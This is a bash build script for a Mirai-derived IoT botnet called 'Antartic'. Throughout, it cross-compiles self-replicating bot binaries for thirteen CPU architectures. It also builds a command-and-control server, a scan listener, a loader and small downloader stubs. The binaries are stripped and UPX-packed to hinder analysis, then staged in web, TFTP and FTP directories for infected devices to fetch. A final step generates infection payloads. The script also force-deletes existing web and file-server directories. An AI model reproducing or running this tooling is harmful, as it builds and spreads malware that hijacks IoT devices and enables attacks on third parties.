#!/bin/bash
clear
echo 'Starting Auto Build For Antartic'
sleep 1
export PATH=$PATH:/etc/xcompiler/arc/bin
export PATH=$PATH:/etc/xcompiler/armv4l/bin
export PATH=$PATH:/etc/xcompiler/armv5l/bin
export PATH=$PATH:/etc/xcompiler/armv6l/bin
export PATH=$PATH:/etc/xcompiler/armv7l/bin
export PATH=$PATH:/etc/xcompiler/i586/bin
export PATH=$PATH:/etc/xcompiler/i686/bin
export PATH=$PATH:/etc/xcompiler/m68k/bin
export PATH=$PATH:/etc/xcompiler/mips/bin
export PATH=$PATH:/etc/xcompiler/mipsel/bin
export PATH=$PATH:/etc/xcompiler/powerpc/bin
export PATH=$PATH:/etc/xcompiler/sh4/bin
export PATH=$PATH:/etc/xcompiler/sparc/bin

export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    local compiler_path="/etc/xcompiler/$1/bin/$1-gcc"
    local strip_path="/etc/xcompiler/$1/bin/$1-strip"
    
    if [ -f "$compiler_path" ]; then
        echo "Compiling $2 with $compiler_path..."
        "$compiler_path" $3 bot/*.c -std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o ~/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\" -D_FORTIFY_SOURCE=0 -D__KERNEL__ 2>/dev/null
        if [ -f ~/release/"$2" ] && [ -f "$strip_path" ]; then
            "$strip_path" ~/release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr 2>/dev/null
            echo "Successfully compiled and stripped $2"
        elif [ -f ~/release/"$2" ]; then
            echo "Successfully compiled $2 (strip not available)"
        else
            echo "Failed to compile $2"
        fi
    else
        echo "Warning: $compiler_path not found, skipping compilation of $2"
    fi
}

function compile_bot_arm7 {
    local compiler_path="/etc/xcompiler/$1/bin/$1-gcc"
    
    if [ -f "$compiler_path" ]; then
        echo "Compiling $2 with $compiler_path..."
        "$compiler_path" $3 bot/*.c -std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o ~/release/"$2" -DMIRAI_BOT_ARCH=\""$1"\" -D_FORTIFY_SOURCE=0 -D__KERNEL__ 2>/dev/null
        if [ -f ~/release/"$2" ]; then
            echo "Successfully compiled $2"
        else
            echo "Failed to compile $2"
        fi
    else
        echo "Warning: $compiler_path not found, skipping compilation of $2"
    fi
}

function arc_compile {
    if command -v "$1-linux-gcc" >/dev/null 2>&1; then
        echo "Compiling $2 with $1-linux-gcc..."
        "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -o ~/release/"$2" -D_GNU_SOURCE -D_FORTIFY_SOURCE=0 2>/dev/null
        if [ -f ~/release/"$2" ]; then
            echo "Successfully compiled $2"
        else
            echo "Failed to compile $2"
        fi
    else
        echo "Warning: $1-linux-gcc not found, skipping compilation of $2"
    fi
}

rm -rf ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp

mkdir ~/release
mkdir -p ~/dlr/release
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins
mkdir /var/www/html/bins
touch /var/www/html/index.html
touch /var/www/html/bins/index.html
touch /var/www/html/bins/index.html
go build -o loader/cnc cnc/*.go
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go

arc_compile arc static.arc "-static -DSELFREP -DSTABLE"
compile_bot i586 static.x86 "-static -DSELFREP -DSTABLE"
compile_bot i686 static.i686 "-static -DSELFREP -DSTABLE"
compile_bot mips static.mips "-static -DSELFREP -DSTABLE"
compile_bot mipsel static.mpsl "-static -DSELFREP -DSTABLE"
compile_bot armv4l static.arm "-static -DSELFREP -DSTABLE"
compile_bot armv5l static.arm5 "-DSELFREP -DSTABLE"
compile_bot armv6l static.arm6 "-static -DSELFREP -DSTABLE"
compile_bot_arm7 armv7l static.arm7 "-static -DSELFREP -DSTABLE"
compile_bot powerpc static.ppc "-static -DSELFREP -DSTABLE"
compile_bot sparc static.spc "-static -DSELFREP -DSTABLE"
compile_bot m68k static.m68k "-static -DSELFREP -DSTABLE"
compile_bot sh4 static.sh4 "-static -DSELFREP -DSTABLE"
clear
echo 'we are ready soon!'


if ls ~/release/static.* 1> /dev/null 2>&1; then
    cp ~/release/static.* /var/lib/tftpboot
    mv ~/release/static.* /var/www/html/bins
    echo "Static binaries copied to web directories"
else
    echo "No static binaries found to copy"
fi

compile_bot i586 selfrep.debug "-static -DDEBUG -DSTABLE -DSELFREP"
compile_bot i586 attack.debug "-static -DDEBUG -DSTABLE"

gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader

echo "reboot" > ~/dlr/release/dlr.arc
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mv ~/dlr/release/dlr* ~/loader/bins

wget https://github.com/upx/upx/releases/download/v3.95/upx-3.95-i386_linux.tar.xz
unxz upx-3.95-i386_linux.tar.xz
tar -xf upx-3.95-i386_linux.tar
mv upx*/upx .
./upx --ultra-brute /var/www/html/bins/*
./upx --ultra-brute /var/lib/tftpboot/*
#./upx --ultra-brute /var/ftp/*
rm -rf upx*
clear
echo 'Creating Payload Antartic'
sleep 1
python payload.py
clear
echo 'Compiling Finished Antartic'
